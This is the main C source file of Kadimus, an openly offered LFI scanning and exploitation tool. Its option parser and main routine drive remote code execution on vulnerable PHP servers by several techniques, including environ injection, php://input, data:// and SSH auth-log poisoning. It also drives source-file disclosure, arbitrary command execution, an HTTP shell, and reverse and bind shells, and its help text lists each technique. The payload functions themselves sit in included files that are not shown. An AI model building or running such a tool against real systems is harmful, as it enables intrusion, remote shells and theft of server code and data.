// Coded by MMxM (@hc0d3r)
// P0cl4bs Team: Mh4x0f, N4sss , Kwrnel, MovCode, joridos, Brenords
// Greetz to:
// Cyclone, xstpl, rafiki, Dennis, susp3it0virtual, kodo no kami, chuck kill, Wulf
// janissaries team

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/wait.h>

#include "kadimus_common.h"
#include "kadimus_str.h"
#include "kadimus_mem.h"
#include "kadimus_request.h"
#include "kadimus_xpl.h"
#include "kadimus_regex.h"
#include "kadimus_socket.h"
#include "kadimus_io.h"

#define VERSION "1.0"
#define IN_RANGE(a,b,c) ((a >= b && a <= c) ? 1 : 0)
#define OPTS "hB:A:u:U:t:X:C:F:c:srbi:p:Gf:o:nl:O:"

void help(void);
void banner(void);

static xpl_parameters xpl;

struct all_opts {
	char *url;
	char *ip_addr;
	char *filename;
	FILE *url_list;
	FILE *source_output;
	size_t port;
	size_t listen;
	size_t threads;
	bool bind_shell;
	bool reverse_shell;
	bool shell;
	bool get_source;
};

static struct all_opts options;

static struct option long_options[] = {
	{"help", no_argument, 0, 'h'}, // ok
	{"cookie", required_argument, 0, 'B'}, //ok
	{"user-agent", required_argument, 0, 'A'}, //ok
	{"connect-timeout", required_argument, 0, 0}, //ok
	{"url", required_argument, 0, 'u'}, // fazer chegagem
	{"url-list", required_argument, 0, 'U'}, //ok
	{"target", required_argument, 0, 't'}, //ok
	{"rce-technique", required_argument, 0, 'X'}, //ok
	{"code", required_argument, 0, 'C'}, //ok

	{"cmd", required_argument, 0, 'c'}, //ok
	{"shell", no_argument, 0, 's'}, //ok

	{"reverse-shell", no_argument, 0, 'r'}, //ok
	{"listen", required_argument, 0, 'l'},

	{"bind-shell", no_argument, 0, 'b'}, //ok

	{"connect-to", required_argument, 0, 'i'}, //ok
	{"port", required_argument, 0, 'p'}, //ok
	//ok
	{"ssh-port", required_argument, 0, 0}, //ok
	{"ssh-target", required_argument, 0, 0},
	{"retry-times", required_argument, 0, 0}, //ok

	{"get-source", no_argument, 0, 'G'}, //ok
	{"filename", required_argument, 0, 'f'}, //ok
	{"output", required_argument, 0, 'o'}, // quase_ok

	{"threads", required_argument, 0, 0},
	{"inject-at", required_argument, 0, 0},

	{"proxy", required_argument, 0, 0},

	{0, 0, 0, 0}
};


void parser_opts(int argc, char **argv){

	int Getopts, option_index = 0;
	int tmp;

	timeout = 10;
	retry_times = 5;

	while( (Getopts = getopt_long(argc, argv, OPTS, long_options, &option_index)) != -1){
		switch(Getopts){

			case 0:
				if(!strcmp(long_options[option_index].name, "connect-timeout")){
					tmp = (int) strtol(optarg, NULL, 10);
					if( !IN_RANGE(tmp, 5, 120) )
						die("--connect-timeout error: please set a value between 5 and 120 seconds",0);
					else
						timeout = (size_t) tmp;
				}

				else if(!strcmp(long_options[option_index].name, "ssh-port")){
					tmp = (int) strtol(optarg, NULL, 10);
					if( !IN_RANGE(tmp, 1, 65535) )
						die("--ssh-port error: set a valide port (1 .. 65535)",0);
					else
						xpl.ssh_port = (size_t) tmp;
				}

				else if(!strcmp(long_options[option_index].name, "ssh-target")){
					if( valid_ip_hostname(optarg) )
						xpl.ssh_host = optarg;
					else
						die("--ssh-target error: invalid ip/hostname",0);
				}

				else if(!strcmp(long_options[option_index].name, "retry-times")){
					tmp = (int) strtol(optarg, NULL, 10);
					if( !IN_RANGE(tmp, 0, 10) )
						die("--retry-times error: value must be between 0 and 10",0);
					else
						retry_times = (size_t) tmp;
				}

				else if(!strcmp(long_options[option_index].name, "threads")){
					tmp = (int) strtol(optarg, NULL, 10);
					if( !IN_RANGE(tmp, 2, 1000) )
						die("--threads error: set a valide value (2..1000)",0);
					else
						options.threads = (size_t) tmp;
				}

				else if(!strcmp(long_options[option_index].name, "inject-at")){
					xpl.p_name = optarg;
				}

				else if(!strcmp(long_options[option_index].name, "proxy")){
					if( regex_match(PROXY_REGEX, optarg, 0, 0) )
						proxy = optarg;
					else
						die("--proxy invalid syntax",0);
				}

			break;

			case 'h':
				help();
			break;

			case 'B':
				cookies = optarg;
			break;

			case 'A':
				UA = optarg;
			break;

			case 'u':
				if( regex_match(URL_REGEX, optarg, 0, 0) )
					options.url = optarg;
				else
					die("-u, --url URL Have invalid syntax",0);
			break;

			case 'U':
				options.url_list = xfopen(optarg,"r");
			break;

			case 't':
				xpl.vuln_uri = optarg;
			break;

			case 'X':
				if(!strcmp("environ",optarg))
					xpl.tech = ENVIRON;
				else if(!strcmp("auth",optarg))
					xpl.tech = AUTH;
				else if (!strcmp("input",optarg))
					xpl.tech = INPUT;
				else if (!strcmp("data", optarg))
					xpl.tech = DATA;
				else
					die("-X, --rce-technique Invalid RCE technique",0);
			break;

			case 'C':
				if( regex_match("^\\s*?\\<\\?.+\\?\\>\\s*?$",optarg,0,PCRE_DOTALL) )
					xpl.code = optarg;
				else
					die("-C, --code parameter must contain php brackets",0);
			break;

			case 'c':
				xpl.cmd = optarg;
			break;

			case 's':
				options.shell = true;
			break;

			case 'r':
				options.reverse_shell = true;
			break;

			case 'b':
				options.bind_shell = true;
			break;

			case 'i':
				if( valid_ip_hostname(optarg) )
					options.ip_addr = optarg;
				else
					die("-i, --connect-to error: Invalid IP/Hostname",0);
			break;

			case 'p':
				tmp = (int) strtol(optarg, NULL, 10);
				if( !IN_RANGE(tmp, 1, 65535) )
					die("-p, --port error: set a valide port (1 .. 65535)",0);
				else
					options.port = (size_t) tmp;
			break;

			case 'G':
				options.get_source = true;
			break;

			case 'f':
				options.filename = optarg;
			break;

			case 'o':
				output = xfopen(optarg,"a");
				setlinebuf(output);
			break;

			case 'O':
				options.source_output = xfopen(optarg,"a");
			break;

			case 'l':
				tmp = (int) strtol(optarg, NULL, 10);

				if( !IN_RANGE(tmp, 1, 65535) )
					die("-l, --listen error: set a valide port (1 .. 65535)",0);
				else
					options.listen = (size_t) tmp;
			break;

			default:
				abort();

		}

	}

	if(options.reverse_shell && options.bind_shell)
		die("error: reverse connection & bind connection are enabled",0);

	if(options.reverse_shell && !options.listen)
		die("error: -r,reverse-shell required -l, --listen option",0);

	if(options.threads && !options.url_list)
		die("error: --threads required -U, --url-list option",0);

	if(!xpl.p_name && xpl.tech == DATA)
		die("error: RCE data type required --inject-at option",0);

	if(!options.url && !options.url_list && !xpl.vuln_uri)
		die("kadimus: try 'kadimus -h' or 'kadimus --help' for display help",0);

}

void banner(void){
	printf(" _  __         _ _                     \n");
	printf("| |/ /__ _  __| (_)_ __ ___  _   _ ___ \n");
	printf("| ' // _` |/ _` | | '_ ` _ \\| | | / __|\n");
	printf("| . \\ (_| | (_| | | | | | | | |_| \\__ \\\n");
	printf("|_|\\_\\__,_|\\__,_|_|_| |_| |_|\\__,_|___/\n");
	printf("\n");
	printf("  v%s - LFI Scan & Exploit Tool (@hc0d3r - P0cL4bs Team)\n\n",VERSION);
}

void help(void){
	printf("Options:\n\
  -h, --help                    Display this help menu\n\
\n\
  Request:\n\
    -B, --cookie STRING         Set custom HTTP Cookie header\n\
    -A, --user-agent STRING     User-Agent to send to server\n\
    --connect-timeout SECONDS   Maximum time allowed for connection\n\
    --retry-times NUMBER        number of times to retry if connection fails\n\
    --proxy STRING              Proxy to connect, syntax: protocol://hostname:port\n\
\n\
  Scanner:\n\
    -u, --url STRING            Single URI to scan\n\
    -U, --url-list FILE         File contains URIs to scan\n\
    -o, --output FILE           File to save output results\n\
    --threads NUMBER            Number of threads (2..1000)\n\
\n\
  Explotation:\n\
    -t, --target STRING         Vulnerable Target to exploit\n\
    --injec-at STRING           Parameter name to inject exploit\n\
                                (only need with RCE data and source disclosure)\n\
\n\
  RCE:\n\
    -X, --rce-technique=TECH    LFI to RCE technique to use\n\
    -C, --code STRING           Custom PHP code to execute, with php brackets\n\
    -c, --cmd STRING            Execute system command on vulnerable target system\n\
    -s, --shell                 Simple command shell interface through HTTP Request\n\
\n\
    -r, --reverse-shell         Try spawn a reverse shell connection.\n\
    -l, --listen NUMBER         Port to listen\n\
\n\
    -b, --bind-shell            Try connect to a bind-shell\n\
    -i, --connect-to STRING     Ip/Hostname to connect\n\
    -p, --port NUMBER           Port number to connect\n\
\n\
    --ssh-port NUMBER           Set the SSH Port to try inject command (Default: 22)\n\
    --ssh-target STRING         Set the SSH Host\n\
\n\
    RCE Available techniques\n\
\n\
      environ                   Try run PHP Code using /proc/self/environ\n\
      input                     Try run PHP Code using php://input\n\
      auth                      Try run PHP Code using /var/log/auth.log\n\
      data                      Try run PHP Code using data://text\n\
\n\
    Source Disclosure:\n\
      -G, --get-source          Try get the source files using filter://\n\
      -f, --filename STRING     Set filename to grab source [REQUIRED]\n\
      -O FILE                   Set output file (Default: stdout)\n\
\n");
exit(0);
}

int main(int argc, char **argv){

	size_t max_len = 0, thread_count = 0, i = 0;
	pthread_t *thrs = NULL;
	char *line = NULL;
	pid_t bg_listen = 0;

	banner();
	parser_opts(argc, argv);

	curl_global_init(CURL_GLOBAL_ALL);

	if(options.url){
		scan(options.url);
	}

	if(options.threads){
		if( (thrs = calloc(options.threads, sizeof(pthread_t)) ) == NULL)
			die("calloc() error",1);

		init_locks();
		thread_on = true;

	} else {
		thread_on = false;
	}

	if(options.url_list){
		max_len = get_max_len(options.url_list);
		line = xmalloc( (max_len+1)* sizeof(char) );

		while( readline(options.url_list, line, max_len) ){
			if( regex_match(URL_REGEX, line, 0, 0) ) {
				if(!options.threads){
					scan(line);
				} else {
					pthread_create(&thrs[thread_count], 0, thread_scan, (void *) xstrdup(line));
					thread_count++;

					if(thread_count == options.threads){

						for(i=0; i < options.threads; i++){
							pthread_join(thrs[i], NULL);
							thrs[i] = 0;
						}

						thread_count = 0;
					}

				}
			}
		}

		xfree(line);
		fclose(options.url_list);
	}

	if(options.threads){

		for(i=0; i<options.threads; i++){
			if(thrs[i] == 0)
				continue;
			else
				pthread_join(thrs[i], NULL);
		}

		xfree(thrs);
		kill_locks();
	}

	if(options.url_list){
		printf("\n[~] Scan Complete !!!\n\n");
	}

	if(options.get_source && xpl.vuln_uri && options.filename && xpl.p_name){
		source_disclosure_get(xpl.vuln_uri, options.filename, xpl.p_name, options.source_output);
	}

	if(xpl.tech==AUTH){
		printf("[*] Checking /var/log/auth.log poison ...\n");
		if( check_auth_poison(xpl.vuln_uri) ){
			printf("[+] Ok\n\n");
		} else {
			printf("[-] error, try inject in log file ...\n");

			if( ssh_log_poison(xpl.ssh_host, xpl.ssh_port) ){

				printf("[+] Log injection OK, checking file ...\n");

				if( check_auth_poison(xpl.vuln_uri) ){
					printf("[+] Injection Sucessfull\n\n");
				} else {
					printf("[-] error\n\n");
					exit(1);
				}
			}

			else {
				printf("[-] error\n\n");
			}


		}

	}

	if(xpl.vuln_uri && options.shell && xpl.tech){
		rce_http_shell(xpl.vuln_uri, xpl.tech, xpl.p_name);
	}

	if(options.reverse_shell){
		bg_listen = fork();

		if(bg_listen == 0){
			reverse_shell(options.listen);
			return 0;
		}

		else if(bg_listen < 0){
			die("fork() error",1);
		}

		sleep(1);
	}

	if(xpl.code && xpl.vuln_uri && xpl.tech){
		xpl.cmdx = false;
		exec_php(xpl);
	}

	if(xpl.cmd && xpl.vuln_uri && xpl.tech){
		xpl.cmdx = true;
		exec_php(xpl);
	}

	if(options.bind_shell && options.ip_addr && options.port){
		bind_shell(options.ip_addr, options.port);
	}

	if(options.reverse_shell){
		waitpid(bg_listen, NULL, 0);
	}

	if(output)
		fclose(output);

	curl_global_cleanup();


	return 0;


}
